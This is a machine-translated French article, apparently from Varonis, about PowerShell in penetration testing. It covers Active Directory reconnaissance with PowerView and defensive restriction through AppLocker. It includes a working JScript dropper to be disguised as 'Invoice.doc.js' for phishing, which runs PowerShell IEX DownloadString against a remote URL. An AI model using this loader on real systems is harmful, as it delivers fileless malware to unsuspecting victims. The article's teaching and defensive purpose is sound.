<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🍞 🤨 🥔 PowerShell comme outil Pentest: scripts et exemples Varonis 🏪 ⛹🏾 🛣️</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Les pirates aiment utiliser PowerShell pour exécuter des «logiciels malveillants sans fichier», des logiciels malveillants incorporels qui ne sont pas...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>PowerShell comme outil Pentest: scripts et exemples Varonis</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/varonis/blog/471420/"><img src="https://habrastorage.org/webt/yz/rz/dv/yzrzdvxroj9qy1wcx-68ukv3leq.png"><br><br>  Les pirates aiment utiliser PowerShell pour exécuter des «logiciels malveillants sans fichier», des logiciels malveillants incorporels qui ne sont pas des binaires traditionnels avec du code malveillant compilé, et pour cette raison, ils ne peuvent parfois pas être détectés par les solutions antivirus. <br><br>  Bien entendu, PowerShell a toujours eu un objectif tout à fait normal, qui au départ n'avait rien à voir avec les tests de pénétration.  Ceux d'entre vous qui veulent connaître le contexte de PowerShell devraient lire le célèbre <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">manifeste Monad</a> .  Écrit par l'un des développeurs d'origine, ce manifeste explique pourquoi Microsoft avait besoin d'un nouveau langage de script (en d'autres termes, des scripts), qui s'est finalement transformé en PowerShell. <br><a name="habracut"></a><br>  Pour vous éviter d'avoir à consulter un long document de 17 pages, je vais vous révéler le principal facteur de motivation qui a incité les auteurs de PowerShell: il était censé permettre aux administrateurs système d'accéder aux objets .Net à partir de la ligne de commande, permettant ainsi l'automatisation du flux de travail au niveau du système, plutôt que au niveau de la programmation approfondie en C # ou C ++. <br><br>  Si vous voulez des preuves réelles de l'efficacité de PowerShell (ci-après dénommé PS), demandez à vos administrateurs système comment ils ajoutent massivement des utilisateurs à Active Directory ou effectuent des paramètres de sécurité rapides.  Vous en apprendrez très probablement sur les <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">solutions PowerShell</a> .  En bref: PS est un excellent moyen de réduire les routines et d'augmenter la productivité des administrateurs. <br><br><h2>  <font color="#D21927">Pourquoi utiliser PowerShell pour les pentests?</font> </h2><br>  Malheureusement, ce qui est si bien adapté en tant qu'outil d'automatisation puissant pour les administrateurs est finalement utile pour les pirates et les testeurs de pénétration. <br><br>  Supposons qu'un administrateur informatique ait été chargé de déterminer qui utilise réellement un serveur sous-chargé.  À l'aide de PowerShell et de la bibliothèque de fonctions avancées <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">PowerView</a> , l'administrateur système peut afficher rapidement les utilisateurs connectés au serveur <i>, sans avoir besoin d'</i> être connecté à ce serveur lui-même: <br><br><img src="https://habrastorage.org/webt/vd/uj/4j/vduj4jfbtmqjuu1ewwqyxdqyiw4.png"><br><br>  Cependant, les cybercriminels qui avaient précédemment obtenu un accès via une attaque de phishing peuvent également faire de même, comme  ils peuvent utiliser les mêmes fonctionnalités dans un domaine Active Directory (ci-après dénommé AD).  Et leurs activités ne seront pas nécessairement détectées: un analyste de la sécurité de l'information qui surveille l'utilisation des applications peut conclure que, puisqu'il <i>ne s'agit que de PowerShell, il doit être inoffensif</i> . <br><br>  Pour aggraver encore plus cet exemple, les pirates peuvent même obtenir toutes les informations détaillées sur les utilisateurs individuels à l'aide de la commande Get-NetUser, qui videra tous les attributs utilisateur dans AD: <br><br><img src="https://habrastorage.org/webt/0k/xe/pf/0kxepfiywrasehvmphwsez5we9e.png"><br><br>  Malheureusement, les entreprises négligent parfois les attributs AD qu'elles rendent publics pour tous les employés - par exemple, domicile ou téléphone portable, adresse, etc.  Avant PowerShell, il était beaucoup plus difficile de collecter toutes ces données depuis AD, mais ce n'est pas le cas! <br><br>  Que peuvent faire les attaquants avec ces informations?  Ils peuvent facilement profiter des méthodes d' <i>ingénierie sociale</i> et développer une attaque pour cela: peut-être en envoyant <br>  Un e-mail avec suffisamment de contexte personnel dérivé des attributs AD pour ressembler à une demande d'assistance légitime vous demandant de «réinitialiser votre mot de passe». <br><br>  Soit dit en passant, vous pouvez également appliquer le contrôle ACL aux attributs AD, il existe donc un (!) Moyen de réduire le risque d'attaques de ce type.  Et c'est l'un de ces résultats positifs que vous pouvez obtenir de votre propre expérience de test de pénétration. <br><br><img src="https://habrastorage.org/webt/j3/pw/qy/j3pwqywf-zkdv4k043qheddjmne.png"><br><br><h2>  <font color="#D21927">Tutoriel PowerShell Pentester</font> </h2><br>  À l'aide de PowerShell, les attaquants peuvent collecter discrètement des données utilisateur internes, puis les utiliser dans leurs attaques.  Mais il n'y a aucune raison pour que le personnel informatique ou de sécurité de l'information ne puisse pas également apprendre suffisamment PowerShell pour démarrer ses propres tests et apprendre à comprendre l'état d'esprit et les motivations du pirate. <br><br>  La première chose intéressante à propos de PowerShell est que tous les anciens scripts et fichiers bat que vous avez exécutés à partir de la ligne de commande cmd.exe fonctionnent toujours dans la console PowerShell.  Déjà pas mal, non? <br><br>  Le prochain point important est que, contrairement aux shells de type Linux, PowerShell traite tout comme <i>un objet</i> .  Même la sortie d'une commande (pensez seulement) est également un objet. <br><br>  Par exemple, entrez la commande <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Get-ChildItem</a> (ou l'applet de commande d'une manière différente, car les commandes sont appelées dans le monde PS) dans la console, et vous verrez une liste de fichiers dans le répertoire actuel: <br><br><img src="https://habrastorage.org/webt/wd/0g/vp/wd0gvpktcvbl8m3ol0qqzms9xx4.png"><br><br><h3>  <font color="#D21927">Encodage PowerShell</font> </h3><br>  Supposons que vous vouliez écrire un script PS dans lequel seuls les fichiers de <i>plus de 10 Mo</i> sont affichés - par exemple, pour vérifier rapidement quels fichiers occupent beaucoup d'espace.  Cette tâche sera beaucoup plus difficile à résoudre dans la sortie de chaîne, disons, du shell bash.  Cependant, dans PowerShell, la sortie de toute commande est elle-même un objet avec un ensemble d' <i>attributs</i> . <br><br>  Pour voir cela, passez simplement la sortie GetChildItem à <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Get-Member</a> , qui vous indiquera les attributs de l'applet de commande PS: <br><br><img src="https://habrastorage.org/webt/ax/2s/4b/ax2s4bab8oyaibmvzitbhdsayiq.png"><br><br>  Ainsi, nous avons maintenant des identifiants pour deux attributs qui nous intéressent: la longueur «longueur» et le nom «nom», auxquels nous pouvons nous référer par programmation.  5 minutes - vol normal. <br><br>  Pour faire face à la situation fréquente où les objets sont parfois dans des tableaux ou des collections, nous utiliserons l' <i>opérateur</i> PS <i>ForEach</i> pour parcourir le tableau. <br><br>  Pour rendre les choses encore plus faciles, un alias ou un alias "%" signifie "ForEach" et "$ _" représente l'objet actuel. <br><br><h3>  <font color="#D21927">Exécution de commandes à l'aide de PowerShell</font> </h3><br>  Tirons nos deux colonnes de sortie de la commande GetChildItem en fonction de nos nouvelles connaissances.  L'exemple ci-dessous est un pipeline avec Get-ChildItem qui alimente l'instruction ForEach, qui affiche uniquement les valeurs des attributs «longueur» et «nom»: <br><br><pre><code class="plaintext hljs">get-childitem | % {write-host $_.length $_.name -separator "`t`t"}</code> </pre> <br>  Et voici le résultat de l'exécution des commandes: <br><br><img src="https://habrastorage.org/webt/ic/fp/ag/icfpag8gul8ihfk--_tkqgdkzpk.png"><br><br>  Pour terminer notre magnifique exemple, ajustons notre script pour ne produire que des fichiers volumineux, disons, plus de 10 Mo.  Pour ce faire, nous utilisons un filtre appelé <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">applet de commande Where-Object</a> avec l'alias pratique "?". Il possède tous les opérateurs de comparaison habituels (-gt, -eq, -lt, etc.). Nous l'insérons au milieu du pipeline et du nôtre le script ressemble maintenant à ceci: <br><br><pre> <code class="plaintext hljs"> get-ChildItem | ? {$_.length –gt 10000000 | % {write-host$_.length $_.name -separator "`t`t"}</code> </pre> <br>  En tant qu'exercice, essayez d'exécuter la création PS ci-dessus dans votre propre environnement. <br><br><h2>  <font color="#D21927">Tutoriel: Exemple de test de pénétration PowerShell</font> </h2><br>  Avec cette petite expérience avec PowerShell, nous sommes prêts à prendre un exemple pentest très réel.  L'un des moyens les plus rapides d'entrer dans un pentest est d'utiliser PowerShell pour masquer la charge utile.  Nous avons écrit sur la façon <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">de le faire ici</a> . <br><br>  L'idée est de cacher notre code PowerShell dans un document Office standard avec le suffixe .doc.  En fait, le fichier aura l'extension .js, et lorsqu'il est cliqué, il active le <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">lancement d'un script Windows</a> pour exécuter JavaScript, qui lancera ensuite le code PowerShell intégré. <br><br>  Un peu déroutant, non?  Mais les vrais pirates utilisent non pas un, mais plusieurs niveaux d'imbrication et d'obscurcissement afin de cacher et de confondre leur attaque autant que possible. <br><br><h3>  <font color="#D21927">Bootloader et préparation de la charge utile</font> </h3><br>  Voici à quoi ressemble le script: <br><br><pre> <code class="plaintext hljs">a=new ActiveXObject('Wscript.Shell');a.Run("powershell -nop -noe -Command IEX (New-Object System.Net.WebClient).DownloadString('https://tinyurl.com/y5nupk4e')",1,true);</code> </pre> <br>  Vous collez le code ci-dessus dans un fichier texte et le renommez quelque chose comme <i>Invoice.doc.js</i> .  Le <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">code</a> JavaScript ci-dessus agit comme un chargeur qui s'exécute à l'aide des applets de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">commande</a> PowerShell <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">NetWebClient</a> et <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Invoke-Expression</a> intégrées, qui sont elles-mêmes des alias avec "%". <br><br>  La méthode <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">DownloadString</a> de la cmdlet NetWebClient extrait à distance la charge utile réelle, qui fait finalement tout le sale boulot pour nous. <br><br>  Vous pouvez insérer votre propre URL pointant vers votre propre programme de test.  Eh bien, l'applet de commande Invoke-Expression accepte le code de notre fichier malveillant, puis l'exécute. <br><br><h3>  <font color="#D21927">Découvrez-le!</font> </h3><br>  Dans mon cas, l'URL pointe vers un projet Github contenant une simple commande PS Write-Host qui affichera un message inoffensif mais important pour toute l'humanité.  Dans une véritable attaque, un fichier d'un tel scénario pourrait bien être joint à une liste de diffusion de phishing, ce qui attirerait un employé sans méfiance dans un piège de curiosité.  Et la charge utile sera beaucoup plus destructrice. <br><br><img src="https://habrastorage.org/webt/xu/xl/9w/xuxl9wgbtv0tmkyxmzuq1paqvyu.png"><br><br>  Vous pouvez essayer ceci sur votre propre installation.  Et si tout ce qui précède fonctionne avec succès, alors vous avez une tâche urgente et importante de plus, qui doit être effectuée sans échec. <br><br><h2>  <font color="#D21927">Avantages des tests de pénétration</font> </h2><br><img src="https://habrastorage.org/webt/up/uh/os/upuhostqscl7nnjnwnwlmhp2d1u.png"><br><br>  Cela nous amène aux raisons pour lesquelles nous faisons des tests de pénétration.  Voici trois avantages réels qui viennent à l'esprit en premier: <br><br><ol><li>  En explorant les équipes PowerShell en tant que pentester, vous comprendrez comment les pirates informatiques «piratent» ce merveilleux langage de script de nouvelle génération.  Considérez simplement la combinaison des méthodes DownloadString et Invoke-Expression, permettant aux attaquants d'extraire du code malveillant à distance sur le site de la victime <i>sans</i> avoir besoin de l'enregistrer entre les deux. </li><li>  Cet exercice met également l'accent sur le secret d'un pirate informatique moderne.  J'ai montré dans l'exemple ci-dessus un schéma d'attaque qui ne laisse aucun fichier autour.  Par conséquent, vous ne pouvez pas utiliser des méthodes standard basées sur les signatures pour détecter de manière fiable une attaque effectuée à l'aide de PowerShell.  Trite, nous n'avons pas la signature du malware lui-même pour comparaison. </li><li>  Vous allez probablement commencer à explorer des moyens de <i>restreindre</i> PowerShell et d'autres méthodes basées sur des scripts.  En fin de compte, l'attaque commence par un script, donc si les entreprises rendent difficile l'exécution de scripts, elles peuvent réduire considérablement leur profil de risque. </li></ol><br>  Permettez-moi de développer le dernier point.  Vous ne voudrez probablement pas interdire complètement PowerShell (ou JavaScript), car il s'agit d'une partie fondamentale du logiciel système Windows.  Heureusement, Microsoft a un moyen de désactiver sélectivement les scripts (et autres exécutables) via <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">AppLocker</a> , une version améliorée des anciennes stratégies de restriction logicielle dans les stratégies de groupe (GPO) modernes. <br><br>  Cela peut sembler incroyable aux techniciens, mais la plupart des utilisateurs ordinaires n'ont pas besoin de PowerShell ou d'autres langages de script pour faire leur travail quotidien.  Bien sûr, c'est choquant, je sais!  AppLocker, par exemple, peut être configuré pour désactiver l'accès PowerShell pour les masses, tout en permettant aux administrateurs système de continuer à travailler dur. <br><br>  Les attaques basées sur des scripts, y compris celles liées aux pièces jointes aux e-mails, dépendent des administrateurs pour fournir aux employés des autorisations de script trop larges.  Et cela ne devrait pas en être ainsi! </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr471420/">https://habr.com/ru/post/fr471420/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr471404/index.html">Est-il possible de gagner plus en travaillant comme ingénieur dans un autre pays?</a></li>
<li><a href="../fr471408/index.html">Une alternative aux onduleurs à phase vibrante: les lignes de transmission (TQWT, ALT)</a></li>
<li><a href="../fr471412/index.html">Un article sur un tas d'ordure sur le bureau</a></li>
<li><a href="../fr471414/index.html">Système de Help Desk leader. Comment obtenir les exigences et développer un service cloud?</a></li>
<li><a href="../fr471418/index.html">Que peut apprendre le marché de la réalité virtuelle à un concepteur de jeux?</a></li>
<li><a href="../fr471424/index.html">L'histoire de Nitro, un service de traduction professionnel qui aide les développeurs avec la localisation et le support multilingue</a></li>
<li><a href="../fr471426/index.html">Comment l'informatique peut grandement aider la ferme collective "The Way of Communism" ou une exploitation agricole</a></li>
<li><a href="../fr471430/index.html">Comment négocier avec un critique interne</a></li>
<li><a href="../fr471432/index.html">Le vilain casque Aftershokz, ou comment Marvel inspire et ce qui inspire</a></li>
<li><a href="../fr471434/index.html">Se connecter automatiquement à une conférence Lync sur Linux</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>